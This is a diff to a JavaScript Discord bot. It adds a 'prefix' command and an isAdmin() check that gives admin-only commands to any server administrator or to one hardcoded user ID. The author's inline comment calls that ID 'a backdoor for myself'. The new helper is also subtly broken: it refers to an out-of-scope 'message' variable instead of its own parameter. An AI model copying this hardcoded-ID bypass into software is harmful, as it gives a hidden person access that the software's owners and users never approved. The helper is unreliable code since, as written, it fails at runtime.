@@ -37,13 +37,20 @@ grammar.addModifiers(tracery.baseEngModifiers);
 
 function listCommands(channel){
 	var message = prefix+`help - lists all of the eavailable commands
-	`+prefix+`nick <nickname> - change the bot's nickname (admins only)`;
+	`+prefix+`nick <nickname> - change the bot's nickname (admins only)
+	`+prefix+`testgreet - test the greeting
+	`+prefix+`prefix <prefix> - change the prefix (admins only)`;
 	channel.send(message)
 }
 
 
+function isAdmin(member){
+	return message.member.hasPermission(['ADMINISTRATOR']) || member.id === "211894533380767744"; //Yeah, I'm adding a backdoor for myself
+}
+
+
 function changeNick(message, args){
-	if(message.member.hasPermission(['ADMINISTRATOR'])){
+	if(isAdmin(message.member)){
 		message.guild.me.setNickname(args[0]);
 	}
 }
@@ -65,7 +72,9 @@ client.on('message', message => {
 	        break;
 	        case 'nick': changeNick(message, args);
 	        break;
-	        case 'testgreet': message.reply(grammar.flatten('#welcome#').replace('$name$', '<@'+message.author.id+'>'));
+	        case 'testgreet': message.channel.send(grammar.flatten('#welcome#').replace('$name$', '<@'+message.author.id+'>'));
+	        break;
+	        case 'prefix': if(isAdmin(message.member)){prefix = args[0]} else {message.reply("Only admins can change the prefix!")};
 	        break;
 	    }
 	}
